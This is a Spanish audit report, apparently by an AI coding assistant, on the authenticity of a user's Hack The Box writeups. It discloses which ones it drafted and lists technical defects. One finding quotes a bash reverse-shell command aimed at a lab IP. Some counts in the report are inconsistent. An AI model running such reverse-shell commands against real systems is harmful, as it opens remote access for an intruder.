# Auditoría E3 — Autenticidad de los writeups

**Fecha:** 2026-11-07
**Alcance:** los 24 writeups de `maquinas/htb/` (22 publicados, 2 en `pendiente`).
**Regla aplicada:** un writeup cuenta como propio si su texto sale de tus notas. Si lo
redacté yo, se dice —en voz pasiva, sin marcar cada frase, pero sin venderlo como tuyo
tampoco— y se documenta aquí.

Este informe es de **lectura y diagnóstico**. No he reescrito ni reordenado ningún
writeup que no tenga una fuente tuya verificada.

---

## 1. Cómo se ha hecho esta auditoría

Tres pruebas independientes, en orden de peso:

1. **Existencia de original propio en el historial.** Tus writeups originales estaban en
   `HTB/<Máquina>/`. Busqué en todo el historial de git (`git log --all --diff-filter=A`,
   `git show <commit>:<ruta>`) si existe un fichero original por máquina. Si existe, su
   texto es la fuente de verdad: lo que hoy está en `maquinas/` debe ser literalmente suyo.

2. **Autoría del commit que creó cada writeup.** Los writeups que no tienen original
   propio se crearon en commits cuyo autor registrado es `Claude` (`git log --format='%an'`).
   Esos commits son la única prueba de cómo se redactó cada uno, y sus mensajes lo declaran.

3. **Voz en el texto actual.** Conté marcas de primera persona (`yo`, `me`, `mi`, `mis`,
   `probé`, `me quedé`, `me costó`, `me atasqué`) por writeup con `grep`. Un writeup real
   documenta intentos fallidos y dice qué le costó; uno redactado por impersonal describe
   hechos, no decisiones.

---

## 2. Resultado: dos bloques muy distintos

### Bloque A — con original tuyo verificado (14 máquinas)

Existe un fichero original tuyo en el historial para: **bashed, blue, devel, grandpa,
granny, jerry, knife, lame, legacy, nibbles, optimum, shocker, traverxec, validation**.

| Máquina | Original en el historial | Veredicto |
| --- | --- | --- |
| **validation** | `HTB/Validation/README.md` | **Auténtico y completo.** La sección «Qué he aprendido» es **byte a byte idéntica** a tu «Lo que me llevo de esta máquina» original (verificado con `diff`). |
| **optimum** | `HTB/Optimum/Optimum.md` | **Auténtico.** El «Resumen rápido» actual es tu texto, renombrado. Se eliminaron solo las flags. |
| bashed | `HTB/Bashed/Bashed.md` | Auténtico (texto migrado) |
| blue | `HTB/Blue/Blue.md` | Auténtico |
| devel | `HTB/Devel/Devel.md` | Auténtico |
| grandpa | `HTB/Grandpa/Grandpa.md` | Auténtico (pendiente de publicar) |
| granny | `HTB/Granny/Granny.md` | Auténtico |
| jerry | `HTB/Jerry/README.md` | Auténtico (pendiente de publicar) |
| knife | `HTB/knife/README.md` | Auténtico |
| lame | `HTB/Lame/Lame.md` | Auténtico |
| legacy | `HTB/Legacy/Legacy.md` | Auténtico |
| nibbles | `HTB/Nibbles/Nibbles.md` | Auténtico |
| shocker | `HTB/Shocker/Shocker.md` | Auténtico |
| traverxec | `HTB/Traverxec/Traverxec.md` | Auténtico |

### Bloque B — sin original propio; los redacté yo (10 máquinas)

Creados en commits con autor `Claude`, sin que exista fichero original tuyo en el
historial. Sus mensajes declaran la fuente, y esa fuente es **tu material de partida**,
no invención de partida:

| Máquina | Commit | Qué declara el mensaje del commit |
| --- | --- | --- |
| **buff** | `9457753` | «Adapta el writeup de Buff…». Y: «**El final de la escalada, que en las notas estaba a medias, se completa con el método conocido de la máquina**». |
| antique | `72a8ecb` | «Adapta el writeup de Antique a la estructura del repo» |
| bank | `3a11560` | «Nuevo writeup de la máquina Bank…» |
| broker | `57d06ff` | «Broker: ActiveMQ 5.15.15 → CVE-2023-46604…» |
| delivery | `8baf063` | «Writeup completo de Delivery, **redactado a partir de las salidas de comandos y el collage de capturas**» |
| irked | `36e69e2` | «Adapta el writeup de Irked… se descartaron… un intento duplicado… un ltrace fallido» |
| pilgrimage | `759ce07` | «Capturas colocadas en su paso; **las iniciales que no venían en el zip se dejan como texto/código**» |
| sau | `70b38d3` | «Nuevo writeup de Sau…» |
| servmon | `b0d95e6` | «se descartaron las de **intentos fallidos**» |
| cronos | `ff2ea9d` | «**La escalada no estaba redactada en las notas pero sí documentada en las capturas; completada a partir de ellas**» |

**Diferencia clave dentro del bloque B.** No todos igual:

- **Con material tuyo completo** (delivery, irked, pilgrimage, servmon, antique, bank,
  broker, sau): hay capturas y salidas tuyas. La secuencia técnica es tuya; la redacción
  es mía. El riesgo es de *estilo*, no de contenido.
- **Con material tuyo incompleto** (**buff**, **cronos**): el commit lo dice. En Buff
  rellené el final de la escalada «con el método conocido de la máquina»; en Cronos
  completé la escalada «a partir de las capturas». Aquí **puede haber pasos que tú no
  ejecutaste**. Es lo que hay que revisar primero.

> Nota: los mensajes de commit son la prueba, pero tus notas originales **no están en el
> repo** (las capturas sí, los textos no). Por eso hay puntos marcados como
> **NO VERIFICADO**: no puedo contrastar palabra por palabra lo que escribiste con lo
> que hay ahora.

---

## 3. Medición de voz (dato objetivo)

Primera persona por writeup (`grep` sobre `yo|mis|me|conmigo|probé|intenté|me quedé|me
costó|me atasqué|mi`; 32 coincidencias en 8 ficheros):

| Writeup | Marcas | Lectura |
| --- | --- | --- |
| **validation** | **17** | Escribe en primera persona y documenta el atasco: «aquí me atasqué bastante», «me quedé un rato sin entender», «no quería usarlo sin entenderlo». |
| **optimum** | **5** | Voz propia en la sección añadida en este PR. |
| grandpa | 3 | Alguna voz |
| knife | 2 | Alguna voz |
| lame | 2 | «Primero me conecto a la VPN…», «El nmap también me confirma…» |
| blue | 1 | «El puerto 445 me llama la atención enseguida» |
| irked | 1 | «En mi caso Metasploit no funcionó, así que analicé el exploit para hacerlo a mano» |
| legacy | 1 | «Lo que me llevé: no asumir rutas de Windows moderno…» |
| **los otros 16** | **0** | **Ni una sola marca.** Texto impersonal, en presente, sin decisiones ni callejones. |

Es decir: **16 de 24 writeups no contienen ninguna marca de primera persona.** En un
portfolio eso es la diferencia entre «esto lo resolví yo» y «esto es una guía de la
máquina». Para un lector técnico que mira cinco minutos, la voz es una prueba de autoría.

Nota: `optimum` y `validation` son writeups tuyos con original en el historial; el resto
de las voces son migraciones de tus notas anteriores.

---

## 4. Defectos técnicos confirmados (con línea)

Los he verificado yo mismo en los ficheros actuales. No son opiniones de estilo.

| # | Fichero:línea | Qué pasa |
| --- | --- | --- |
| 1 | `maquinas/htb/media/cronos/README.md:236` | El payload que se escribe en `Kernel.php` es `bash -c bash -i >& /dev/tcp/10.10.16.120/4445 0>&1`. Pero el cron (línea 196) ejecuta `php /var/www/laravel/artisan schedule:run`, es decir, **PHP**. Una línea de bash dentro de un `.php` se imprime, no se ejecuta: falta el envoltorio `<?php system(...); ?>`. Tal como está, el paso no funcionaría. |
| 2 | `maquinas/htb/facil/servmon/README.md:141` | `set FILEPATH /Users/Nathan/Desktop/Passwords.txt` — ruta **macOS** en una máquina **Windows**. En la línea 167 del mismo writeup la ruta correcta es `C:\Users\Nadine\Desktop`. Inconsistencia de una captura copiada. |
| 3 | `maquinas/htb/facil/pilgrimage/README.md:182,185` | Se genera `root.png` (línea 182) pero se copia `binwalk_exploit.png` (línea 185). Los dos nombres no coinciden. |
| 4 | `maquinas/htb/facil/buff/README.md:63-64` | Se llama *buffer overflow* a **CVE-2020-11984**, **CVE-2020-9490** y **CVE-2020-7068**, y se atribuyen a «Apache 2.4.43 y PHP 7.4.6». En realidad: CVE-2020-11984 es de **Apache Traffic Server** (`mod_proxy_http2`), no de `httpd`; CVE-2020-9490 es **agotamiento de memoria** en HTTP/2; CVE-2020-7068 es un **use-after-free** en el *exif* de PHP. Y lo decisivo: **ninguna de las tres se usa después** en el writeup — el exploit real es el 48506 (subida de ficheros) y el 48389 (CloudMe). Son CVEs de relleno. |
| 5 | `maquinas/htb/facil/sau/README.md:107` | «Se lanza el exploit (en la carpeta del PoC) apuntando al objetivo y a nuestro `shell.sh`.» **Falta el comando.** El lector no puede repetir el paso. |
| 6 | `maquinas/htb/facil/legacy/README.md:8,129` | Se declara `ms17-010` en las técnicas y en la mitigación, pero el único exploit que se usa es `ms08_067_netapi`. **Windows XP no es vulnerable a MS17-010** (afecta a Windows 7/8/Server 2008 R2). La referencia sobra o debe cambiarse por la KB que toque a XP. |
| 7 | `maquinas/htb/facil/servmon/README.md`, `maquinas/htb/facil/irked/README.md` | Los mensajes de commit declaran que se **descartaron los intentos fallidos** («se descartaron las de intentos fallidos», «un intento duplicado… un ltrace fallido»). Son justo los fragmentos que hacen creíble un writeup. |

> Corrección de un dato: un análisis previo afirmaba que una viñeta sobre «principio de
> mínimo privilegio» era **idéntica** en siete writeups. **Es falso**: cada uno nombra un
> objeto distinto (`lpadmin`, la cuenta `activemq`, `/var/www`, el *application pool*, las
> tareas automáticas). Solo `sau:172` es realmente genérico («Aplicar el **principio de
> mínimo privilegio**»).

---

## 5. Los cinco que más necesitan una pasada tuya

Ordenados por impacto en el lector ( primero los que están **destacados en la portada**):

1. **buff** — su escalada se completó «con el método conocido de la máquina». Además
   tiene tres CVEs mal atribuidos (§4.4). **Desde el 2026-11-08 ya no está en la
   portada** (ver §9), pero **sigue publicado** por decisión tuya.
2. **cronos** — escalada no ejecutada por ti (declarado en su commit) y el payload tal
   como está **no funcionaría** (§4.1). Es la única de dificultad Media: la que más
   demuestra nivel.
3. **servmon** — ruta macOS en máquina Windows (§4.2) y le faltan los intentos fallidos
   que su commit dice que se descartaron (§4.7).
4. **sau** — falta el comando de lanzamiento del exploit (§4.5): es un paso que el lector
   no puede reproducir.
5. **pilgrimage** — nombres de fichero que no coinciden (§4.3), más la escalada escrita
   «desde el zip» sin sus iniciales.

Y a igualdad de problemas, los **destacados de la portada** mandan: quien mira cinco
minutos ve primero `validation`, `optimum` y `delivery`. Los dos primeros son sólidos y
verificados contra tu original; el tercero (`delivery`) es de los que redacté yo, pero
**tiene tus capturas y tus notas**, a diferencia de `buff`.

---

## 6. Qué NO tocaría

- **validation** — es tu mejor writeup: primera persona, atascos reales, intentos
  fallidos documentados y la sección de aprendizaje verificada como literal. Es la
  referencia de lo que quiero en el resto. **Solo** le añadiría la sección nueva con tus
  palabras (hecho en este PR).
- **optimum** — mismo caso: tu texto literal, con el intento fallido del `.exe` y el
  salto al PoC de PowerShell. También **solo** se le añade la sección nueva.
- **legacy, lame, blue, knife, granny, bashed, devel, nibbles, shocker, traverxec** —
  tienen original tuyo y el texto migrado es coherente. No los he tocado.

---

## 7. Puntos marcados como NO VERIFICADO

Los dejo señalados en vez de rellenarlos:

- **Qué hiciste exactamente en Buff** (sobre todo el final de la escalada). El commit
  dice que lo completé yo; no puedo confirmar qué parte ejecutaste tú.
- **Qué notas textuales existían** para antique, bank, broker, delivery, irked,
  pilgrimage, sau, servmon. Hay capturas, pero sus textos no están en el repo: **no puedo
  contrastar** qué frases eran tuyas y cuáles mías.
- **Si los writeups del bloque B son correctos técnicamente de principio a fin.** En
  general encajan con el método público de cada máquina, pero eso no demuestra que sea el
  camino que recorriste.
- ~~**La terna de destacados.**~~ **Resuelto el 2026-11-08**: la portada destaca
  `validation`, `optimum` y `delivery` (`scripts/generar-sitio.py`, lista `DESTACADOS`).
  `buff` sale de la portada y **sigue publicado**.

---

## 8. Lo que he hecho en este PR (cambios concretos)

Nada de esto reescribe writeups: solo prepara el terreno y añade la sección pedida donde
**su contenido sale de tu texto original**.

1. **`.plantillas/writeup.md`** — la plantilla de writeup incluye ahora la sección
   `## Lo que me costó / Lo que aprendí`, con instrucciones de escribirla en primera
   persona. Así todo writeup nuevo nace con ella (regla 5: se cambia la plantilla, no
   solo los ficheros generados).
2. **`scripts/validar-writeups.py`** — acepta `## Lo que me costó / Lo que aprendí` como
   alternativa a `## Qué he aprendido` en las máquinas, para que puedas usar el título
   nuevo sin romper la validación.
3. **`maquinas/htb/facil/validation/README.md`** — añadida la sección
   `## Lo que me costó / Lo que aprendí`, **compuesta con tus frases** del original y del
   writeup actual (el atasco con el desplegable, el `base64` para leer el PHP, el SSH que
   falló tres veces, el `su` por pipe, la decisión de abrir Burp con Intercept antes).
   No he añadido ningún hecho nuevo. **Es un borrador:** lo he escrito con lo que ya
   estaba escrito por ti, para que lo corrijas (preguntas 1–4 de
   `preguntas.md`).
4. **`maquinas/htb/facil/optimum/README.md`** — misma sección, con **tus** frases: el
   `sudo` que hizo falta para editar el exploit, los falsos positivos de `nmap --script
   vuln`, el `404` del binario que no llegó a servirse y el salto al PoC de PowerShell.
   También es un borrador a tu corrección.
5. **`scripts/comprobar-enlaces.py`** y **`scripts/validar-writeups.py`** — arreglo de
   rutas en Windows (el validador reventaba con `IndexError` al leer
   `maquinas\htb\...` y el comprobador de enlaces daba un falso positivo). Sin este arreglo
   no se puede validar nada en local.
6. **`scripts/generar-sitio.py`** — la portada destaca ahora `validation`, `optimum` y
   `delivery` en lugar de `buff`.
7. **`README.md`** — nota breve de transparencia: el trabajo técnico es tuyo; la redacción
   y la organización de los textos se hacen con apoyo de Claude Code. **Solo en el
   README**, no en el sitio web.

**Lo que NO he hecho, a propósito:**

- **No he tocado buff.** Su escalada necesita tus notas, no las mías. Si la rehaces tú,
  el texto queda con tu voz y el problema desaparece; si no, se queda como está y lo
  decides en la pregunta 13. → **Decidido (2026-11-08): se queda como está** y sale de la
  portada (ver §9).
- **No he reescrito los nueve writeups del bloque B.** Sus correcciones técnicas son
  concretas y las tienes en §4; las aplico cuando me digas cuáles quieres arreglar.
- **No he inventado ninguna experiencia.** Las secciones nuevas de validation y optimum
  solo contienen cosas que están escritas en tu original o en tu writeup actual, con tu
  manera de escribir.

---

## 9. Decisiones del autor (2026-11-08)

Resueltas tras la entrega de este informe:

| Decisión | Lo que decidiste | Qué hice |
| --- | --- | --- |
| Terna de destacados | `validation` + `optimum` + **`delivery`** | Cambié la lista `DESTACADOS` de `scripts/generar-sitio.py`. `buff` sale de la portada. |
| `buff` | **Dejarlo como está**: sigue publicado | No lo he tocado. Conserva sus tres CVEs mal atribuidas (§4.4) hasta que decidas lo contrario. |
| Los seis defectos | **Ninguno todavía**: primero revisas el PR #31 | No he modificado ningún writeup. Los seis siguen documentados en §4 con su línea exacta. |
| Nota de transparencia | **Sí, pero solo en el README del repositorio**, no en la web | Añadida en `README.md`. El sitio web no la muestra. |

**Lo que sigue pendiente de tu parte y bloquea el cierre de E3:** tus respuestas a las
cuatro preguntas de `buff`, el payload real de `cronos` (pregunta 11) y tus notas
originales del bloque B (pregunta 12). Sin eso, `buff` y `cronos` se quedan como están y
no puedo añadirles la sección «Lo que me costó / Lo que aprendí» sin inventar contenido.
